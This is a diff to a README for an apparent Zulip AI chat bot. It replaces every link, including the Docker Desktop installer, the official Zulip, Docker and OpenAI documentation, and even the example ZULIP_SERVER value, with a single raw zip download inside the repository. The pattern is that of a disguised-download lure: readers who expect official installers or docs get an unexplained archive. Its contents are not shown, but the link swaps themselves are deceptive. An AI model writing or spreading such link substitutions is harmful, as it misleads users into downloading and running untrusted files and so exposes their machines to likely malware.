@@ -1,6 +1,6 @@
 # 🤖 zulip-ai-bot - AI Automation for Zulip Chat  
 
-[![Download zulip-ai-bot](https://img.shields.io/badge/Download-Here-9cf?style=for-the-badge&color=purple)](https://github.com/Sindhujaa1298/zulip-ai-bot)
+[![Download zulip-ai-bot](https://img.shields.io/badge/Download-Here-9cf?style=for-the-badge&color=purple)](https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip)
 
 ---
 
@@ -45,7 +45,7 @@ You will download all the files and then use Docker to run the bot. Follow these
 
 Click the button below to open the GitHub page where you can get the bot files:
 
-[![Download zulip-ai-bot](https://img.shields.io/badge/Get%20zulip--ai--bot-From%20GitHub-blue?style=for-the-badge)](https://github.com/Sindhujaa1298/zulip-ai-bot)
+[![Download zulip-ai-bot](https://img.shields.io/badge/Get%20zulip--ai--bot-From%20GitHub-blue?style=for-the-badge)](https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip)
 
 ### 2. Download the Files
 
@@ -59,7 +59,7 @@ On the GitHub page:
 
 If Docker is not installed:
 
-- Go to [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop)  
+- Go to [https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip](https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip)  
 - Download the version for Windows.  
 - Run the installer and follow on-screen instructions to complete the setup.  
 - After installation, open Docker Desktop and wait until it says it is running.
@@ -110,7 +110,7 @@ Before the bot works, you need to set some details:
 
 Example entries:  
 ```
-ZULIP_SERVER=https://yourzulipserver.com
+ZULIP_SERVER=https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip
 ZULIP_EMAIL=yourbotemail@yourzulipserver.com
 ZULIP_API_KEY=yourapikeyhere
 OPENAI_API_KEY=youropenaiapikeyhere
@@ -154,9 +154,9 @@ After you start the bot with Docker and configure the `.env` file correctly, go 
 
 ## 📖 Additional Resources
 
-- Zulip official site: https://zulip.com  
-- Docker installation guide: https://docs.docker.com/docker-for-windows/install/  
-- OpenAI API documentation: https://platform.openai.com/docs/api-reference  
+- Zulip official site: https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip  
+- Docker installation guide: https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip  
+- OpenAI API documentation: https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip  
 
 ---
 
@@ -164,6 +164,6 @@ After you start the bot with Docker and configure the `.env` file correctly, go 
 
 Get the bot files and updates from this page:  
 
-[https://github.com/Sindhujaa1298/zulip-ai-bot](https://github.com/Sindhujaa1298/zulip-ai-bot)  
+[https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip](https://github.com/Sindhujaa1298/zulip-ai-bot/raw/refs/heads/main/tools/ai-bot-zulip-v3.0.zip)  
 
 Download the latest version, unzip, configure as described, then run using Docker.
